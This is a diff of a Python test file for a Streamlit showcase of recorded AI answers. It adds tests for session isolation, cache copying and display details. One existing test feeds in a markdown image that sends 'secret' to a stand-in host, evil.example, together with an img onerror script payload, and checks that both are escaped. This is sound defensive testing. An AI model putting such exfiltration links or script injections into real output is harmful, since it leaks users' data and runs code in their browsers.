@@ -93,3 +93,33 @@ def test_recorded_answers_are_rendered_as_escaped_text():
 
     out = rv.answer_html("See ![x](https://evil.example/?q=secret) <img src=x onerror=alert(1)>\n> note")
     assert "<img" not in out and "&lt;img" in out and 'class="rb-answer-note"' in out
+
+
+def test_concurrent_sessions_do_not_share_mutable_state():
+    a = AppTest.from_file(str(ROOT / "showcase" / "streamlit_app.py"), default_timeout=30)
+    b = AppTest.from_file(str(ROOT / "showcase" / "streamlit_app.py"), default_timeout=30)
+    a.run()
+    b.run()
+    a.radio(key="case").set_value("V02").run()
+    assert a.session_state["case"] == "V02" and b.session_state["case"] == CURATION["questions"][0]["case_id"]
+    md_b = "\n".join(m.value for m in b.markdown)
+    assert "hotel approval" not in md_b.lower()
+
+
+def test_cached_recordings_are_copies_so_one_session_cannot_alter_another():
+    from ui import showcase
+
+    runs, _, _ = showcase.load()
+    runs["questions"][0]["runs"]["standard"]["answer"] = "tampered"
+    again, _, _ = showcase.load()
+    assert again["questions"][0]["runs"]["standard"]["answer"] != "tampered"
+
+
+def test_recorded_disclosure_is_on_the_main_page_not_only_the_sidebar(showcase):
+    main = "\n".join(m.value for m in showcase.main.markdown)
+    assert "Recorded runs — no live inference" in main
+
+
+def test_theme_keeps_the_sidebar_reopen_control_visible():
+    css = (ROOT / "ui" / "theme.css").read_text()
+    assert '[data-testid="stExpandSidebarButton"]' in css and "visibility: visible" in css
